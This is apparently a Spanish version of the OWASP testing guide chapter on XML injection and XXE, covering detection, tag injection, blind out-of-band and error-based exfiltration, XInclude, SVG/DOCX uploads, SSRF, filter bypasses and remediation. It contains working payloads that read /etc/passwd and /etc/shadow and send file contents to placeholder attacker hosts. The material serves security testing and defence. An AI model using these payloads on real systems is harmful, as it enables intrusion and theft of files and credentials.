Inyección XML

ID
WSTG-INJT-07

Resumen

Las pruebas de inyección XML consisten en que un evaluador intenta inyectar o manipular un documento XML dentro de una aplicación. Si el analizador XML no valida contextualmente los datos o está configurado de forma insegura, la prueba arrojará un resultado positivo.

Esta sección describe ejemplos prácticos de inyección XML. Primero se definirá una API de comunicación basada en XML y se explicarán sus principios de funcionamiento. Luego se demuestra el método de descubrimiento, en el que se intenta insertar metacaracteres XML. Una vez cumplido el primer paso, el evaluador tendrá información sobre la estructura XML, lo que hace posible inyectar datos y etiquetas XML (Tag Injection), o explotar la configuración del analizador para acceder a recursos locales y remotos (inyección de entidades externas XML / XXE).

Objetivos de la prueba

  • Identificar los puntos de inyección XML.
  • Evaluar los tipos de exploits que se pueden lograr y sus severidades.

Cómo probar

Supongamos que existe una aplicación web moderna o un servicio web (como una API SOAP o RESTful) que acepta formato XML para el registro de usuarios.

Cuando un usuario se registra rellenando un formulario HTML o interactuando con una aplicación cliente, la aplicación envía los datos del usuario en una petición POST que contiene un payload XML:

POST /api/addUser HTTP/1.1
Host: www.example.com
Content-Type: application/xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <email>s4tan@hell.com</email>
</user>

La aplicación de backend analiza este payload XML e inserta los valores analizados en la base de datos o en el estado interno (a menudo aumentándolo con campos generados por el servidor, como userid). Si la aplicación construye dinámicamente respuestas XML o reenvía estos datos XML a otro sistema de backend concatenando cadenas sin el saneamiento adecuado, se vuelve vulnerable a la inyección estructural de XML. Alternativamente, si el propio analizador XML está configurado de forma insegura, se vuelve vulnerable a ataques basados en entidades (XXE).

Descubrimiento

El primer paso para probar si una aplicación presenta una vulnerabilidad de inyección XML consiste en intentar insertar metacaracteres XML.

Los metacaracteres XML son:

  • Comillas simples y dobles (' y "): cuando no se sanean, estos caracteres pueden provocar una excepción durante el análisis XML o permitir a un atacante cerrar prematuramente un atributo. Esto ocurre cuando la comilla inyectada coincide con el carácter utilizado para encerrar el valor del atributo.

Por ejemplo, supongamos que una aplicación utiliza comillas simples para los atributos:

<node attrib='$inputValue'/>

Si se proporciona el payload $inputValue = foo', el XML resultante es:

<node attrib='foo''/>

El documento XML resultante está mal formado y no es válido. Exactamente la misma lógica se aplica a las comillas dobles (") si el atributo está encerrado entre comillas dobles (p. ej., <node attrib="$inputValue"/>).

  • Paréntesis angulares: > y < - Al añadir un paréntesis angular de apertura o de cierre en una entrada de usuario como la siguiente:

Username = foo<

la aplicación construirá un nuevo nodo:

<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>

pero, debido a la presencia del '<' de apertura, el documento XML resultante no es válido.

  • Etiqueta de comentario: <!-- y --> - Esta secuencia de caracteres se interpreta como el comienzo o el final de un comentario. Así, al inyectar una de ellas en el parámetro Username:

Username = foo<!--

la aplicación construirá un nodo como el siguiente:

<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>

que no será una secuencia XML válida.

  • Ampersand: & - El ampersand se utiliza en la sintaxis XML para representar entidades. El formato de una entidad es &symbol;. Una entidad se asigna a un carácter del conjunto de caracteres Unicode.

Por ejemplo:

<tagnode>&lt;</tagnode>

está bien formado y es válido, y representa el carácter ASCII <.

Si & no está codificado con &amp;, podría utilizarse para probar la inyección XML.

De hecho, si se proporciona una entrada como la siguiente:

Username = &foo

se creará un nuevo nodo:

<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>

pero, de nuevo, el documento no es válido: &foo no termina con ; y la entidad &foo; no está definida.

  • Delimitadores de sección CDATA: <![CDATA[ y ]]> - Las secciones CDATA se utilizan para escapar bloques de texto que contienen caracteres que de otro modo serían reconocidos como marcado. En otras palabras, los caracteres encerrados en una sección CDATA no son analizados por un analizador XML.

Por ejemplo, si hay necesidad de representar la cadena <foo> dentro de un nodo de texto, se puede utilizar una sección CDATA:

<node>
    <![CDATA[<foo>]]>
</node>

de modo que <foo> no se analizará como marcado y se considerará datos de caracteres.

Si un nodo se crea de la siguiente manera:

<username><![CDATA[<$userName]]></username>

el evaluador podría intentar inyectar la cadena de fin de CDATA ]]> para intentar invalidar el documento XML.

userName = ]]>

esto se convertirá en:

<username><![CDATA[]]>]]></username>

que no es un fragmento XML válido.

Otra prueba está relacionada con la etiqueta CDATA. Supongamos que el documento XML se procesa para generar una página HTML. En este caso, los delimitadores de sección CDATA pueden simplemente eliminarse, sin inspeccionar más su contenido. Entonces es posible inyectar etiquetas HTML, que se incluirán en la página generada, eludiendo por completo las rutinas de saneamiento existentes.

Consideremos un ejemplo concreto. Supongamos que tenemos un nodo que contiene algún texto que se mostrará de vuelta al usuario.

<html>
    $HTMLCode
</html>

Entonces, un atacante puede proporcionar la siguiente entrada:

<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>

y obtener el siguiente nodo:

<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>

Durante el procesamiento, los delimitadores de sección CDATA se eliminan, generando el siguiente código HTML:

<script>
    alert('XSS')
</script>

El resultado es que la aplicación es vulnerable a XSS.

Inyección de etiquetas (Tag Injection)

Una vez cumplido el primer paso y cuando el evaluador ha mapeado la estructura XML, es posible intentar inyectar etiquetas XML completas. Esto puede conducir a elusiones de lógica o a escalada de privilegios si la aplicación utiliza el XML analizado para tomar decisiones de autorización.

Consideremos un escenario en el que la entrada del usuario se concatena directamente en una petición XML de backend. La aplicación construye dinámicamente el siguiente nodo XML para comunicarse con un servicio interno:

<user>
    <username>$username</username>
    <password>$password</password>
    <userid>500</userid>
    <email>$email</email>
</user>

Manipulando el campo de entrada $email, el evaluador puede inyectar una etiqueta de cierre para el elemento actual e iniciar uno nuevo. Si la entrada inyectada es:

s4tan@hell.com</email><userid>0</userid><email>s4tan@hell.com

El backend generará el siguiente XML:

<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email><userid>0</userid><email>s4tan@hell.com</email>
</user>

El XML resultante está bien formado. Además, es probable que el analizador XML procese las etiquetas <userid> duplicadas de forma secuencial y sobrescriba el valor inicial (500) con el último valor proporcionado (0, que a menudo representa un ID de administrador). En este caso, el evaluador ha inyectado con éxito un usuario con privilegios administrativos.

El único problema es que las etiquetas userid y email aparecen dos veces. A menudo, los documentos XML se validan contra un esquema o una Definición de Tipo de Documento (DTD) y serán rechazados si no cumplen reglas estrictas de cardinalidad.

Supongamos que el documento XML de backend está estrictamente especificado por una DTD que exige exactamente una etiqueta userid y una etiqueta email por usuario:

<!DOCTYPE user [
    <!ELEMENT user (username,password,userid,email) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT email (#PCDATA) >
]>

En este caso, el simple ataque de inyección de etiquetas mostrado arriba fallará la validación antes de que ocurra cualquier procesamiento.

Sin embargo, esta defensa se puede eludir si el evaluador controla los valores de varios nodos. Al inyectar una secuencia de inicio de comentario XML (<!--) en un campo y una secuencia de fin de comentario XML (-->) en otro, el evaluador puede ocultar los nodos originales generados por el servidor.

Por ejemplo, el evaluador proporciona los siguientes payloads para las entradas:

  • Username: tony
  • Password: Un6R34kb!e</password><!--
  • Email: --><userid>0</userid><email>s4tan@hell.com

La aplicación de backend los concatena en la estructura XML:

<user>
    <username>tony</username>
    <password>Un6R34kb!e</password><!--</password>
    <userid>500</userid>
    <email>--><userid>0</userid><email>s4tan@hell.com</email>
</user>

El nodo original <userid>500</userid> y las etiquetas duplicadas han quedado comentados con éxito, dejando únicamente el <userid>0</userid> inyectado. El documento ahora cumple las estrictas reglas de su DTD y la escalada de privilegios tiene éxito.

Inyección de entidades externas XML (XXE)

El conjunto de entidades XML válidas puede ampliarse definiendo nuevas entidades. Si la definición de una entidad es un URI, la entidad se denomina entidad externa. A menos que se configure de otro modo, las entidades externas obligan al analizador XML a acceder al recurso especificado por el URI, por ejemplo, un archivo en la máquina local o en un sistema remoto. Este comportamiento expone la aplicación a ataques de entidades externas XML (XXE), que pueden utilizarse para realizar denegación de servicio, obtener acceso no autorizado a archivos, escanear redes internas y realizar Server-Side Request Forgery (SSRF).

Para probar vulnerabilidades XXE básicas, se puede inyectar una declaración DOCTYPE con una entidad externa en el payload XML:

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE user [ 
    <!ELEMENT user ANY >
    <!ENTITY xxe SYSTEM "file:///dev/random" >
]>
<user>
    <username>&xxe;</username>
    <password>Un6R34kb!e</password>
    <email>s4tan@hell.com</email>
</user>

Nota: el nombre del DOCTYPE (user) coincide con el elemento raíz real del documento, y la declaración ELEMENT se refiere a ese mismo elemento raíz; un nombre de DOCTYPE/ELEMENT que no coincida o que haya quedado de otro ejemplo (un error común de copiar y pegar al adaptar payloads XXE a un nuevo endpoint) seguirá siendo tolerado por la mayoría de los analizadores que no validan, pero mantenerlos coherentes evita fallos con cualquier analizador que sí realice validación de DTD.

Esta prueba puede provocar una denegación de servicio en sistemas Unix si el analizador XML intenta resolver la entidad leyendo de /dev/random, bloqueándose potencialmente de forma indefinida (o consumiendo recursos significativos) mientras intenta sustituir el valor de la entidad.

Otros payloads útiles para probar la divulgación de archivos locales incluyen:

<!ENTITY xxe SYSTEM "file:///etc/passwd" >
<!ENTITY xxe SYSTEM "file:///etc/shadow" >
<!ENTITY xxe SYSTEM "file:///c:/Windows/win.ini" >
<!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >

XXE a ciegas (Blind XXE)

En muchos casos del mundo real, la aplicación no refleja el valor de una entidad externa en la respuesta HTTP, por lo que el ejemplo clásico de /etc/passwd en la respuesta mostrado arriba no se aplica directamente. Esto se conoce como Blind XXE. La vulnerabilidad sigue presente y sigue siendo explotable, pero la detección y la exfiltración de datos requieren técnicas fuera de banda (OOB) o, cuando el tráfico OOB está bloqueado, una técnica basada en errores.

Detección fuera de banda (OOB) mediante entidades de parámetro

Algunos analizadores o reglas de WAF bloquean las entidades generales clásicas (&xxe;) pero no restringen las entidades de parámetro, que solo pueden referenciarse dentro de una DTD y se declaran con un % en lugar de &. Un evaluador puede usar una entidad de parámetro para obligar al servidor objetivo a realizar una petición DNS/HTTP saliente hacia un listener controlado por el atacante (p. ej., Burp Collaborator, interact.sh o un simple listener netcat/HTTP), confirmando que la inyección está activa aunque no se refleje nada:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/collect">
  %xxe;
]>
<foo>test</foo>

Una consulta DNS o un acceso HTTP resultante en el listener confirma que el analizador XML resuelve entidades externas, es decir, que la aplicación es vulnerable, incluso con una respuesta totalmente ciega.

Exfiltración de datos fuera de banda mediante una DTD externa maliciosa

Una vez confirmada la interacción OOB, el evaluador puede escalar de la detección a la exfiltración real de archivos alojando una DTD externa maliciosa en un servidor controlado por el atacante y encadenando entidades de parámetro para sacar el contenido de los archivos dentro de una petición posterior.

DTD maliciosa alojada en http://<tester-controlled-host>/evil.dtd:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<tester-controlled-host>/?data=%file;'>">
%eval;
%exfil;

Payload enviado a la aplicación objetivo:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/evil.dtd">
  %xxe;
]>
<foo>test</foo>

Cuando el objetivo analiza este documento, obtiene evil.dtd, lee el archivo local en la entidad %file; y luego realiza una segunda petición saliente que incrusta el contenido del archivo como parámetro de consulta, que el evaluador captura en su listener. Dado que las URL no pueden transportar de forma segura datos binarios o con saltos de línea arbitrarios, esta técnica normalmente se limita a texto de una sola línea y seguro para URL; para archivos binarios o archivos que contengan caracteres que rompan la URL, los evaluadores suelen combinarla con un wrapper específico del lenguaje (p. ej., php://filter/convert.base64-encode/resource= de PHP) para codificar en base64 el contenido del archivo antes de la exfiltración, cuando la pila objetivo lo admite.

Exfiltración basada en errores mediante una DTD externa remota

Esta variante todavía requiere que el objetivo realice una conexión saliente (para obtener la DTD del evaluador), pero, a diferencia de la técnica OOB anterior, no requiere que el servidor del atacante reciba una segunda petición que transporte los datos: el contenido del archivo se filtra de vuelta a través de la propia respuesta de error de la aplicación en lugar de una llamada de red. Esto es útil cuando las conexiones salientes están permitidas pero el cuerpo de respuesta de la segunda petición de exfiltración nunca llegaría al evaluador.

DTD alojada en http://<tester-controlled-host>/error.dtd:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

Payload:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/error.dtd">
  %xxe;
]>
<foo>test</foo>

El analizador obtiene la DTD, intenta resolver una ruta inexistente construida a partir de la concatenación del contenido del archivo objetivo, falla y, según el analizador y lo detallado que sea el manejo de errores de la aplicación, lanza una excepción cuyo mensaje divulga la ruta intentada (y que, por lo tanto, ahora contiene el contenido del archivo). Si la aplicación devuelve en su respuesta los errores sin procesar del analizador, esto revela directamente el contenido del archivo.

Exfiltración basada en errores reutilizando una DTD local (sin conectividad saliente)

La técnica anterior todavía necesita una obtención saliente. Si el entorno objetivo realmente no tiene ninguna conectividad saliente (con filtrado total de egreso), esa tampoco es una opción, y un DOCTYPE totalmente interno normalmente no puede redefinir una entidad de parámetro dentro de la definición de otra entidad de parámetro (la especificación XML lo permite solo dentro de DTD externas, y la mayoría de los analizadores lo hacen cumplir).

Una solución fiable consiste en referenciar como DTD "externa" un archivo DTD que ya existe en el propio sistema de archivos local del objetivo (cargado mediante file:// en lugar de http://), y luego redefinir una de las entidades que esa DTD ya declara. Dado que la DTD reutilizada sigue siendo técnicamente "externa" desde el punto de vista del analizador (aunque no se produzca acceso a la red), el truco de redefinición de entidades de parámetro vuelve a ser legal, y la misma fuga basada en errores puede desencadenarse sin conectividad saliente.

Esto requiere conocer la ruta de un archivo DTD que realmente esté presente en el servidor. Los candidatos comunes que vale la pena sondear incluyen bibliotecas de procesamiento XML incluidas con el servidor de aplicaciones (DTD de aplicaciones/servlets incluidas dentro de JAR) y DTD a nivel de sistema operativo, como la DTD de documentación de GNOME/Yelp en muchos sistemas Linux (/usr/share/yelp/dtd/docbookx.dtd). Un evaluador puede enumerar candidatos enviando un payload que solo cargue la DTD (sin redefinir nada): si el archivo no existe, el analizador lanza un error de archivo no encontrado, por lo que se puede sondear una lista de palabras con rutas de DTD conocidas una por una.

Ejemplo, suponiendo que /usr/local/app/schema.dtd existe en el objetivo y define una entidad llamada custom_entity:

<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
  <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>

Obsérvese que el valor redefinido de custom_entity se escribe usando referencias numéricas de caracteres (&#x25; para %, &#x26; para &, &#x27; para ') en lugar de los caracteres literales. Esto es necesario, no estilístico: el texto de reemplazo se analiza a su vez como marcado de DTD una vez sustituido, por lo que un % o un & literal dentro de él se expandiría de inmediato en lugar de sobrevivir intacto hasta que la redefinición surta efecto; las referencias numéricas difieren esa expansión hasta la etapa correcta.

Esto carga la DTD local, sobrescribe su definición de custom_entity con el payload de exfiltración basada en errores y luego invoca %local_dtd; para que el analizador procese la entidad redefinida, desencadenando la misma fuga del contenido del archivo en el mensaje de error que antes, pero sin que salga del servidor un solo byte de tráfico de red. Herramientas como el proyecto dtd-finder mantienen listas de rutas de archivos DTD conocidas (y pueden escanear un sistema de archivos o una imagen de contenedor en busca de las DTD realmente presentes) para acelerar esta búsqueda.

Ataques XInclude

A veces el evaluador solo controla un único valor que luego se incrusta en un documento XML más grande generado por el servidor (por ejemplo, un campo de formulario que termina dentro de una petición SOAP de backend). En ese caso el evaluador no puede controlar ni inyectar una declaración <!DOCTYPE>, lo que descarta los ataques clásicos basados en entidades vistos arriba. XInclude es una parte independiente de la especificación XML que permite que un documento XML incorpore contenido de otra fuente, y puede activarse desde dentro de un valor de datos ordinario, sin necesidad de DOCTYPE:

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1

Si el backend incrusta este valor en su propio documento XML sin escapar y su analizador tiene habilitado el procesamiento de XInclude, el contenido del archivo referenciado se inserta en línea en ese punto del documento resultante.

XXE mediante carga de archivos

Muchas aplicaciones aceptan la carga de formatos de archivo basados en XML o que contienen partes XML incrustadas, incluso cuando la interfaz de carga solo anuncia "documentos" o "imágenes". Estos suelen pasarse por alto como puntos de inyección porque el evaluador no está interactuando con una API XML evidente.

SVG

SVG es un formato de imagen basado en XML. Si una aplicación acepta cargas de SVG (o acepta formatos de imagen arbitrarios y resulta que procesa SVG), un archivo SVG manipulado puede incluir un DOCTYPE con una entidad externa que se resuelve durante el renderizado/procesamiento y, según el flujo de trabajo, el valor resuelto puede incluso renderizarse de forma visible dentro de la imagen generada:

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

Documentos Office Open XML (DOCX / XLSX / PPTX)

Los formatos ofimáticos modernos son archivos ZIP que contienen múltiples partes XML. Un evaluador puede descomprimir un archivo de muestra legítimo, inyectar un DOCTYPE/entidad en una de las partes XML internas y volver a comprimirlo, y luego subirlo a cualquier funcionalidad que analice o convierta el documento en el servidor (generación de vistas previas, extracción de texto, conversión de formato, etc.).

Ejemplo: edición de word/document.xml dentro de un .docx:

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<w:document>
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>

El mismo enfoque se aplica a xl/workbook.xml en archivos .xlsx y a las partes equivalentes en archivos .pptx. Esta es una comprobación útil para cualquier endpoint que ingiera documentos ofimáticos para indexación, generación de miniaturas o conversión; esos flujos de procesamiento suelen construirse sobre bibliotecas XML más antiguas o configuradas de forma laxa, incluso cuando la capa de API principal de la aplicación ha sido endurecida.

Otros formatos basados en XML

Los evaluadores también deben considerar formatos basados en XML menos obvios que una aplicación podría aceptar como entrada, incluidos XLIFF (archivos de intercambio de traducción), feeds RSS/Atom, sobres SOAP y cualquier formato de importación personalizado documentado como "XML" o "basado en XML". Cualquiera de ellos puede transportar los mismos payloads de DOCTYPE/entidad o de XInclude mostrados arriba.

Escalada del impacto: SSRF y captura de credenciales

XXE no se limita a la divulgación de archivos locales: el mismo mecanismo de entidades externas es una primitiva de falsificación de peticiones, por lo que los evaluadores deben evaluar el impacto más allá de /etc/passwd:

  • SSRF hacia servicios de metadatos en la nube. En objetivos alojados en la nube, apuntar una entidad al endpoint de metadatos de la instancia (p. ej., http://169.254.169.254/... en AWS) puede divulgar credenciales temporales; pero hay que tener en cuenta que el valor por defecto actual de AWS, IMDSv2, requiere una petición PUT más una cabecera personalizada para obtener un token de sesión antes de que cualquier GET tenga éxito, y el SSRF impulsado por XXE (mediante un identificador SYSTEM) normalmente solo puede emitir un GET simple. En la práctica, esto significa que un clásico robo de credenciales de metadatos mediante XXE hoy en día solo funciona en su mayoría contra instancias más antiguas o explícitamente mal configuradas que todavía tienen IMDSv1 habilitado (HttpTokens no establecido en required); se deben revisar las opciones de metadatos de la instancia en lugar de asumir que el endpoint es explotable por defecto. Los endpoints de metadatos equivalentes de Azure y GCP requieren de manera similar cabeceras específicas (Metadata: true / Metadata-Flavor: Google) que una entidad simple SYSTEM "http://..." no puede establecer, por la misma razón. Incluso cuando el robo directo de credenciales está bloqueado, alcanzar el endpoint de metadatos sigue siendo útil para confirmar el SSRF y para averiguar en qué nube se ejecuta el objetivo.
  • Escaneo de red/puertos internos. Las diferencias en el tiempo de respuesta o en los mensajes de error entre hosts/puertos internos alcanzables e inalcanzables pueden utilizarse para mapear la topología de la red interna a través del servidor vulnerable.
  • Captura de credenciales mediante rutas UNC (Windows). En analizadores alojados en Windows, apuntar una entidad a una ruta UNC (file://///attacker-ip/share/x) puede hacer que el servidor intente autenticarse por SMB contra un listener controlado por el evaluador, filtrando el hash NTLM de la cuenta de servicio para su descifrado sin conexión.

Estos impactos deben reflejarse en cómo se puntúa la severidad de un hallazgo, según los Objetivos de la prueba anteriores: un XXE ciego de solo lectura de archivos y un XXE que produce credenciales de la nube son hallazgos muy diferentes aunque el punto de inyección sea idéntico.

Técnicas de elusión de filtros y WAF

Si los payloads <!DOCTYPE sencillos están siendo bloqueados o eliminados, vale la pena probar las siguientes variaciones antes de concluir que la aplicación no es vulnerable:

  • Codificación del payload: algunos analizadores aceptan codificaciones de entrada alternativas (p. ej., UTF-7) que no contienen las secuencias de bytes literales que un filtro está buscando, pero que aun así son decodificadas y analizadas como XML por la biblioteca subyacente antes de que se ejecute cualquier lógica de filtrado. Recodificar todo el payload puede eludir filtros ingenuos basados en firmas que solo buscan <!DOCTYPE o <!ENTITY en texto plano.
  • URI de datos (data:): cuando el manejo de protocolos del analizador lo permite, se puede introducir de contrabando un payload codificado en base64 mediante una entidad de parámetro data:text/plain;base64,..., manteniendo el contenido real de la DTD fuera de la petición en forma de texto plano.
  • Wrappers de protocolo alternativos en lugar de file://: en pilas basadas en PHP, wrappers como php://filter/convert.base64-encode/resource= eluden los filtros ingenuos de cadenas file:// y resuelven el problema aparte de exfiltrar contenido binario o de varias líneas (véase la nota sobre exfiltración OOB más arriba). En pilas basadas en Java, el protocolo jar: puede usarse para alcanzar archivos dentro de un archivo ZIP/JAR, incluido uno obtenido desde una URL remota, y es útil cuando el acceso directo file:// está bloqueado pero el acceso basado en archivos comprimidos no.
  • Dividir la confianza entre dos codificaciones: un pequeño número de analizadores decodificarán referencias numéricas de caracteres HTML dentro del valor de una entidad antes de volver a analizarlo como un fragmento de DTD; donde esto se aplique, expresar las palabras clave bloqueadas como referencias numéricas de caracteres puede pasar desapercibido para un filtro que solo reconoce la cadena literal.

Como siempre con las elusiones de filtros, se debe confirmar que el analizador/versión subyacente realmente exhibe el comportamiento en el que se confía, en lugar de asumir que alguna de las anteriores funciona universalmente: son pistas para probar, no elusiones garantizadas.

Una nota sobre los valores por defecto de los analizadores modernos

Muchas bibliotecas y frameworks de análisis XML actuales se distribuyen con la resolución de entidades externas deshabilitada por defecto, o proporcionan un indicador documentado de "procesamiento seguro" cuyo uso real los evaluadores deben confirmar (esto no significa que se puedan omitir las pruebas de XXE; véase la XML External Entity (XXE) Prevention Cheat Sheet). En la práctica, el XXE explotable hoy en día se encuentra con mayor frecuencia donde:

  • Un analizador se configuró de forma segura para la API principal de la aplicación, pero una ruta de código secundaria (procesamiento de carga de archivos, conversión de documentos, generación de informes, endpoint SOAP heredado) utiliza una instancia de analizador diferente y sin endurecer.
  • Las DTD están deshabilitadas pero el procesamiento de XInclude se dejó habilitado (normalmente son indicadores de configuración independientes).
  • Una biblioteca de terceros o una dependencia incorpora su propio análisis XML con valores por defecto inseguros.
  • Todavía se utilizan analizadores más antiguos o construidos a medida (dispositivos embebidos, pilas heredadas de Java/C).

Por lo tanto, los evaluadores deben probar cada ruta de código que consume XML de forma independiente, en lugar de asumir que asegurar un endpoint de la API asegura toda la aplicación.

Pruebas de caja blanca

Al revisar el código fuente, se debe comprobar si los analizadores XML están configurados de forma segura para deshabilitar DOCTYPE, las DTD externas y las entidades de parámetro externas.

Para obtener fragmentos completos de configuración segura para todos los lenguajes, consulte la OWASP XML External Entity (XXE) Prevention Cheat Sheet.

Java

Las siguientes APIs de Java pueden ser vulnerables a XXE si no se configuran correctamente:

  • javax.xml.parsers.DocumentBuilder / DocumentBuilderFactory
  • javax.xml.parsers.SAXParser / SAXParserFactory
  • javax.xml.stream.XMLInputFactory
  • javax.xml.transform.TransformerFactory / SAXTransformerFactory
  • org.xml.sax.XMLReader / EntityResolver
  • org.dom4j.io.SAXReader
  • org.jdom2.input.SAXBuilder
  • Xerces: DOMParser, SAXParser, XMLParser

Nota: las bibliotecas de terceros que procesan formatos basados en XML (como Apache POI para documentos OOXML) también pueden introducir vulnerabilidades XXE y XEE. Al revisar el código, se deben buscar palabras clave de vulnerabilidades históricas como XSSFExportToXml o configuraciones SAX de OPC inseguras. Siempre se debe verificar la versión de la biblioteca frente a los avisos de seguridad conocidos (p. ej., Apache POI CVE Details) en lugar de asumir que son seguras por defecto.

C / C++

Las siguientes palabras clave del código fuente pueden indicar implementaciones vulnerables:

  • libxml2: xmlCtxtReadMemory, xmlCtxtUseOptions, xmlParseInNodeContext, xmlReadDoc, xmlReadFd, xmlReadFile, xmlReadIO, xmlReadMemory, xmlCtxtReadDoc, xmlCtxtReadFd, xmlCtxtReadFile, xmlCtxtReadIO
  • libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader

Python

Se deben revisar los siguientes paquetes y funciones:

  • xml.etree.ElementTree y xml.dom.minidom: aunque no expanden entidades externas por defecto en las versiones actuales de CPython, aún pueden ser susceptibles a denegación de servicio (DoS) por expansión de entidades y otros casos límite.
  • lxml: se comprueba si el analizador se instancia explícitamente con resolve_entities=True (y no_network=False), lo que habilita XXE.
  • Recomendación: defusedxml es el reemplazo directo estándar de los módulos XML de la biblioteca estándar para mitigar de manera uniforme los riesgos de XXE y DoS.

Node.js / JavaScript

Se buscan bibliotecas heredadas o configuradas de forma laxa:

  • libxmljs: la sustitución de entidades externas está desactivada por defecto; se busca una opción explícita { noent: true }, que la vuelve a habilitar.
  • xml2js: esta biblioteca se basa internamente en analizadores de JavaScript puro como sax-js. Aunque no resuelve entidades externas por defecto, puede ser vulnerable a ataques de DoS. Se comprueba si la opción strict está establecida explícitamente en false.
  • xml2json: este módulo utiliza internamente node-expat (bindings C/C++ para el analizador Expat). Aunque Expat generalmente es seguro frente a XXE clásico de divulgación de archivos de forma predeterminada, puede ser susceptible a la expansión de entidades XML (DoS) si no se restringe explícitamente.
  • xmldom: se revisa cualquier configuración explícita de resolución de entidades, ya que su comportamiento y capacidades por defecto han variado históricamente entre versiones.

Corrección

La solución más fiable para los problemas de la clase XXE es eliminar por completo la capacidad del analizador de resolver recursos externos, en lugar de intentar filtrar o sanear la entrada XML. Principios generales, en orden de prioridad:

  • Deshabilitar por completo el procesamiento de DTD siempre que la aplicación no tenga una necesidad de negocio genuina de él. La mayor parte del XML de las aplicaciones (payloads de API, cargas de configuración, envíos de formularios convertidos a XML) nunca necesita legítimamente un DOCTYPE.
  • Si las DTD no pueden deshabilitarse por completo, deshabilitar la resolución de entidades generales y de parámetro externas, y deshabilitar el procesamiento de XInclude; normalmente son indicadores independientes del interruptor de DTD, por lo que desactivar uno no garantiza que el otro esté desactivado.
  • Preferir las APIs/indicadores de configuración del analizador descritos como de "procesamiento seguro" cuando estén disponibles, pero verificar qué cubre realmente ese indicador para el analizador/versión específico en uso, en lugar de asumir que deshabilita todo lo anterior.
  • Aplicar esta configuración a cada instanciación de analizador en el código base y sus dependencias, no solo a la capa de API principal; el manejo de carga de archivos, la conversión de documentos/generación de vistas previas, los trabajos de importación/exportación, los clientes SOAP y las bibliotecas de terceros crean cada uno sus propias instancias de analizador y deben comprobarse de forma independiente.
  • Cuando las entidades externas sean un requisito genuino, implementar una lista de permitidos estricta de URI/esquemas permitidos en lugar de depender de una lista de bloqueo (deny-list) para protocolos peligrosos como file://, ftp://, etc.
  • Aplicar defensa en profundidad: ejecutar los procesos de análisis XML con el mínimo privilegio (sin acceso a archivos sensibles, sin acceso a la red saliente donde no sea necesario) y mantener parcheadas las bibliotecas XML, ya que los valores por defecto a nivel de analizador y las elusiones conocidas cambian entre versiones.

Referencia rápida por ecosistema (verifique con la documentación actual para la biblioteca/versión exacta en uso, ya que los valores por defecto han cambiado con el tiempo y varían según la biblioteca):

  • Java: configure DocumentBuilderFactory/SAXParserFactory/XMLInputFactory/TransformerFactory (y los analizadores basados en Xerces) para deshabilitar las declaraciones DOCTYPE, las entidades generales/de parámetro externas y XInclude.
  • .NET: use XmlReaderSettings con DtdProcessing establecido en Prohibit y XmlResolver establecido en null (o un resolvedor personalizado restrictivo).
  • Python: prefiera una biblioteca de análisis endurecida (p. ej., defusedxml) en lugar de los módulos XML de la biblioteca estándar directamente; para lxml, deje explícitamente resolve_entities en su valor seguro por defecto (o establézcalo en False) y evite habilitar el acceso a la red en el analizador.
